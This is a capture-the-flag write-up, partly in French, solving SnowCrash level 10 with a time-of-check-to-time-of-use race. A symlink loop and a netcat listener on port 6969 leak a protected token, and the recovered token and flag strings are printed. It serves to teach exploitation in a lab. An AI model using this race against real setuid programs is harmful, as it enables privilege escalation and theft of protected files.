# Level 10

</br></br>

## file list in home

```zsh
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

</br></br>

## execute file level10

```zsh
level10@SnowCrash:~$ ./level10
./level10 file host
        sends file to host if you have access to it
```

"./level10 file host" signifie que l'on doit mettre file et host en tant que parametre

</br></br>

## ltrace level10

```zsh
level10@SnowCrash:~$ ltrace ./level10
__libc_start_main(0x80486d4, 1, 0xbffff7f4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
        sends file to host if you have access to it
)    = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

</br></br>

## strings level10

```zsh
...
...
PTRh
UWVS
[^_]
%s file host
        sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
...
...
```

Connecter à 6969, on a besoin d'écouter la porte 6969

```zsh
level10@SnowCrash:~$ ./level10
./level10 file host
        sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
level10@SnowCrash:~$ ltrace ./level10 token localhost
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                                = -1
printf("You don't have access to %s\n", "token"You don't have access to token
)  = 31
+++ exited (status 31) +++
```

on peut voir que level10 utilise access

</br></br>

## access

```zsh
level10@SnowCrash:~$ man access
...
...
 Warning: Using access() to check if a user is authorized to,  for  exam‐
       ple,  open a file before actually doing so using open(2) creates a secu‐
       rity hole, because the  user  might  exploit  the  short  time  interval
       between  checking  and opening the file to manipulate it.  For this rea‐
       son, the use of this system call should be  avoided.   (In  the  example
       just  described,  a safer alternative would be to temporarily switch the
       process's effective user ID to the real ID and then call open(2).)
...
...
```

on peut voir "security hole"!!!!!

```zsh
level10@SnowCrash:~$ ./level10 level10 localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
```

donc, on va executer token en utilisant race condition et symbolic link

</br></br>

## execute

```zsh
level10@SnowCrash:~$ touch /tmp/level10
level10@SnowCrash:~$ ln -s ~/token /tmp/link
level10@SnowCrash:~$ nc -lk 6969
level10@SnowCrash:~$ nc -lk 6969
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
```

```zsh
level10@SnowCrash:~$ while true; do ln -sf /tmp/level10 /tmp/link; ln -sf ~/token /tmp/link; done
```

```zsh
level10@SnowCrash:~$ while true; do ln -sf /tmp/level10 /tmp/link; ln -sf ~/token /tmp/link; done
```

```zsh
level10@SnowCrash:~$ su flag10
Password:
getDon't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$ su level11
Password:
level11@SnowCrash:~$
```
